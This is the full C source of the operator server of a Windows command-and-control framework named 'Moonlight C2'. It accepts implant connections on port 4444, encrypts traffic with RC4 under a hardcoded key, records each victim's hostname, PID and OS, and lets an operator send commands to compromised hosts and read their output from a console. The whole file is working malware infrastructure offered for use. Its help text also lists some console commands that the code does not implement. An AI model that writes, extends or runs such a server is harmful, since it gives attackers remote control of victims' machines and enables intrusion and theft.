/*
 * Moonlight C2 Framework - Enhanced Server with Assembly Integration
 * High-performance multi-threaded C2 server with encryption
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <process.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_PORT 4444
#define MAX_CLIENTS 100
#define BUFFER_SIZE 8192
#define ENCRYPTION_KEY "MoonlightC2SecretKey2025"

// Assembly function declarations
extern void asm_rc4_init(unsigned char* S, const char* key, size_t key_length);
extern void asm_rc4_crypt(unsigned char* S, void* data, size_t length);
extern void asm_xor_encrypt(void* data, size_t length, const char* key, size_t key_length);
extern unsigned int fast_checksum(void* data, size_t length);

typedef struct {
    SOCKET socket;
    int id;
    char hostname[256];
    DWORD pid;
    char os_info[256];
    int active;
    HANDLE thread;
    unsigned char rc4_state[256];
    DWORD last_seen;
    CRITICAL_SECTION lock;
} ClientSession;

typedef struct {
    ClientSession sessions[MAX_CLIENTS];
    int count;
    CRITICAL_SECTION lock;
} SessionManager;

SessionManager g_sessions = {0};
int g_encryption_enabled = 1;
volatile int g_running = 1;

// Initialize session manager
void InitSessionManager() {
    InitializeCriticalSection(&g_sessions.lock);
    for (int i = 0; i < MAX_CLIENTS; i++) {
        g_sessions.sessions[i].active = 0;
        g_sessions.sessions[i].id = i;
        InitializeCriticalSection(&g_sessions.sessions[i].lock);
    }
    printf("[+] Session manager initialized (max clients: %d)\n", MAX_CLIENTS);
}

// Get free session slot
ClientSession* GetFreeSession() {
    EnterCriticalSection(&g_sessions.lock);
    
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (!g_sessions.sessions[i].active) {
            g_sessions.sessions[i].active = 1;
            g_sessions.sessions[i].last_seen = GetTickCount();
            g_sessions.count++;
            LeaveCriticalSection(&g_sessions.lock);
            return &g_sessions.sessions[i];
        }
    }
    
    LeaveCriticalSection(&g_sessions.lock);
    return NULL;
}

// Remove session
void RemoveSession(ClientSession* session) {
    if (!session) return;
    
    EnterCriticalSection(&session->lock);
    EnterCriticalSection(&g_sessions.lock);
    
    if (session->active) {
        closesocket(session->socket);
        session->active = 0;
        g_sessions.count--;
        printf("[!] Session %d terminated (%s)\n", session->id, session->hostname);
    }
    
    LeaveCriticalSection(&g_sessions.lock);
    LeaveCriticalSection(&session->lock);
}

// Send encrypted data to client
int SendEncryptedData(ClientSession* session, const char* data, size_t length) {
    if (!session || !session->active) return -1;
    
    EnterCriticalSection(&session->lock);
    
    // Create buffer for encrypted data
    char* buffer = (char*)malloc(length + 1);
    if (!buffer) {
        LeaveCriticalSection(&session->lock);
        return -1;
    }
    
    memcpy(buffer, data, length);
    
    // Encrypt if enabled
    if (g_encryption_enabled) {
        asm_rc4_crypt(session->rc4_state, buffer, length);
    }
    
    // Send data
    int sent = send(session->socket, buffer, length, 0);
    
    free(buffer);
    LeaveCriticalSection(&session->lock);
    
    return sent;
}

// Receive and decrypt data from client
int ReceiveEncryptedData(ClientSession* session, char* buffer, size_t max_length) {
    if (!session || !session->active) return -1;
    
    int received = recv(session->socket, buffer, max_length - 1, 0);
    
    if (received > 0) {
        buffer[received] = '\0';
        
        // Decrypt if enabled
        if (g_encryption_enabled) {
            EnterCriticalSection(&session->lock);
            asm_rc4_crypt(session->rc4_state, buffer, received);
            LeaveCriticalSection(&session->lock);
        }
        
        session->last_seen = GetTickCount();
    }
    
    return received;
}

// Parse beacon message
void ParseBeacon(ClientSession* session, const char* beacon) {
    char type[64];
    
    if (sscanf(beacon, "%63[^|]|%d|%255[^|]|%255s", 
        type, &session->pid, session->hostname, session->os_info) >= 3) {
        
        printf("[+] New client connected:\n");
        printf("    ID: %d\n", session->id);
        printf("    Hostname: %s\n", session->hostname);
        printf("    PID: %d\n", session->pid);
        printf("    OS: %s\n", session->os_info);
    }
}

// Send command to client
void SendCommand(int session_id, const char* command) {
    if (session_id < 0 || session_id >= MAX_CLIENTS) {
        printf("[!] Invalid session ID\n");
        return;
    }
    
    ClientSession* session = &g_sessions.sessions[session_id];
    
    if (!session->active) {
        printf("[!] Session %d is not active\n", session_id);
        return;
    }
    
    printf("[*] Sending command to session %d: %s\n", session_id, command);
    
    if (SendEncryptedData(session, command, strlen(command)) > 0) {
        printf("[+] Command sent successfully\n");
    } else {
        printf("[!] Failed to send command\n");
    }
}

// Client handler thread
unsigned __stdcall ClientHandlerThread(void* param) {
    ClientSession* session = (ClientSession*)param;
    char buffer[BUFFER_SIZE];
    int received;
    
    printf("[*] Client handler started for session %d\n", session->id);
    
    // Initialize RC4 for this session
    if (g_encryption_enabled) {
        asm_rc4_init(session->rc4_state, ENCRYPTION_KEY, strlen(ENCRYPTION_KEY));
    }
    
    // Main receive loop
    while (session->active && g_running) {
        ZeroMemory(buffer, sizeof(buffer));
        
        received = ReceiveEncryptedData(session, buffer, sizeof(buffer));
        
        if (received > 0) {
            // Check if it's a beacon
            if (strncmp(buffer, "BEACON", 6) == 0) {
                ParseBeacon(session, buffer);
            }
            // Check if it's a heartbeat
            else if (strncmp(buffer, "HEARTBEAT", 9) == 0) {
                printf("[*] Heartbeat from session %d\n", session->id);
            }
            // Otherwise, it's command output
            else {
                printf("\n[Session %d Output]\n", session->id);
                printf("%s\n", buffer);
                printf("[End Output]\n\n");
            }
        }
        else if (received == 0) {
            printf("[!] Client disconnected (session %d)\n", session->id);
            break;
        }
        else {
            printf("[!] Receive error (session %d)\n", session->id);
            break;
        }
        
        Sleep(10);
    }
    
    RemoveSession(session);
    return 0;
}

// Monitor thread for timeouts
unsigned __stdcall MonitorThread(void* param) {
    const DWORD TIMEOUT = 120000; // 2 minutes
    
    while (g_running) {
        Sleep(10000); // Check every 10 seconds
        
        EnterCriticalSection(&g_sessions.lock);
        
        DWORD now = GetTickCount();
        
        for (int i = 0; i < MAX_CLIENTS; i++) {
            if (g_sessions.sessions[i].active) {
                if (now - g_sessions.sessions[i].last_seen > TIMEOUT) {
                    printf("[!] Session %d timed out\n", i);
                    RemoveSession(&g_sessions.sessions[i]);
                }
            }
        }
        
        LeaveCriticalSection(&g_sessions.lock);
    }
    
    return 0;
}

// List active sessions
void ListSessions() {
    EnterCriticalSection(&g_sessions.lock);
    
    printf("\n========== Active Sessions ==========\n");
    printf("%-5s %-20s %-10s %-15s %-10s\n", "ID", "Hostname", "PID", "OS", "Status");
    printf("=====================================\n");
    
    int active_count = 0;
    
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (g_sessions.sessions[i].active) {
            DWORD idle = (GetTickCount() - g_sessions.sessions[i].last_seen) / 1000;
            printf("%-5d %-20s %-10d %-15s %-10s (idle: %ds)\n", 
                i, 
                g_sessions.sessions[i].hostname, 
                g_sessions.sessions[i].pid,
                g_sessions.sessions[i].os_info,
                "Active",
                idle);
            active_count++;
        }
    }
    
    printf("=====================================\n");
    printf("Total: %d active session(s)\n\n", active_count);
    
    LeaveCriticalSection(&g_sessions.lock);
}

// Interactive console
void InteractiveConsole() {
    char input[1024];
    char command[256];
    int session_id;
    
    printf("\nMoonlight C2 Server Console\n");
    printf("Type 'help' for available commands\n\n");
    
    while (g_running) {
        printf("moonlight> ");
        fflush(stdout);
        
        if (!fgets(input, sizeof(input), stdin)) {
            break;
        }
        
        // Remove newline
        input[strcspn(input, "\n")] = 0;
        
        if (strlen(input) == 0) continue;
        
        if (strcmp(input, "help") == 0) {
            printf("\nAvailable commands:\n");
            printf("  list                  - List active sessions\n");
            printf("  use <id>              - Interact with session\n");
            printf("  send <id> <command>   - Send command to session\n");
            printf("  kill <id>             - Terminate session\n");
            printf("  broadcast <command>   - Send command to all sessions\n");
            printf("  stats                 - Show server statistics\n");
            printf("  exit                  - Shutdown server\n\n");
        }
        else if (strcmp(input, "list") == 0) {
            ListSessions();
        }
        else if (sscanf(input, "send %d %[^\n]", &session_id, command) == 2) {
            SendCommand(session_id, command);
        }
        else if (sscanf(input, "kill %d", &session_id) == 1) {
            if (session_id >= 0 && session_id < MAX_CLIENTS) {
                RemoveSession(&g_sessions.sessions[session_id]);
            }
        }
        else if (strcmp(input, "stats") == 0) {
            printf("\n=== Server Statistics ===\n");
            printf("Active Sessions: %d\n", g_sessions.count);
            printf("Encryption: %s\n", g_encryption_enabled ? "Enabled" : "Disabled");
            printf("Port: %d\n", SERVER_PORT);
            printf("========================\n\n");
        }
        else if (strcmp(input, "exit") == 0) {
            printf("[*] Shutting down server...\n");
            g_running = 0;
            break;
        }
        else {
            printf("[!] Unknown command. Type 'help' for available commands.\n");
        }
    }
}

// Main server function
int main(int argc, char* argv[]) {
    WSADATA wsa;
    SOCKET listen_sock, client_sock;
    struct sockaddr_in server, client;
    int client_len;
    
    printf("========================================\n");
    printf("Moonlight C2 Enhanced Server v2.0\n");
    printf("With Assembly-Optimized Encryption\n");
    printf("========================================\n\n");
    
    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[!] WSAStartup failed\n");
        return 1;
    }
    
    // Initialize session manager
    InitSessionManager();
    
    // Create socket
    listen_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_sock == INVALID_SOCKET) {
        printf("[!] Socket creation failed\n");
        return 1;
    }
    
    // Bind
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(SERVER_PORT);
    
    if (bind(listen_sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("[!] Bind failed\n");
        return 1;
    }
    
    // Listen
    listen(listen_sock, MAX_CLIENTS);
    printf("[+] Server listening on port %d\n", SERVER_PORT);
    printf("[+] Encryption: %s\n", g_encryption_enabled ? "Enabled (RC4)" : "Disabled");
    printf("[+] Max clients: %d\n\n", MAX_CLIENTS);
    
    // Start monitor thread
    HANDLE monitor_thread = (HANDLE)_beginthreadex(NULL, 0, MonitorThread, NULL, 0, NULL);
    
    // Start console in separate thread
    HANDLE console_thread = (HANDLE)_beginthreadex(NULL, 0, 
        (unsigned (__stdcall *)(void*))InteractiveConsole, NULL, 0, NULL);
    
    // Accept connections
    while (g_running) {
        client_len = sizeof(struct sockaddr_in);
        client_sock = accept(listen_sock, (struct sockaddr*)&client, &client_len);
        
        if (client_sock == INVALID_SOCKET) {
            if (g_running) {
                printf("[!] Accept failed\n");
            }
            continue;
        }
        
        printf("[+] New connection from %s:%d\n", 
            inet_ntoa(client.sin_addr), ntohs(client.sin_port));
        
        // Get free session
        ClientSession* session = GetFreeSession();
        if (!session) {
            printf("[!] Maximum clients reached\n");
            closesocket(client_sock);
            continue;
        }
        
        session->socket = client_sock;
        
        // Start handler thread
        session->thread = (HANDLE)_beginthreadex(NULL, 0, ClientHandlerThread, 
            session, 0, NULL);
    }
    
    // Cleanup
    printf("[*] Cleaning up...\n");
    closesocket(listen_sock);
    
    // Terminate all sessions
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (g_sessions.sessions[i].active) {
            RemoveSession(&g_sessions.sessions[i]);
        }
    }
    
    WSACleanup();
    printf("[+] Server shutdown complete\n");
    
    return 0;
}
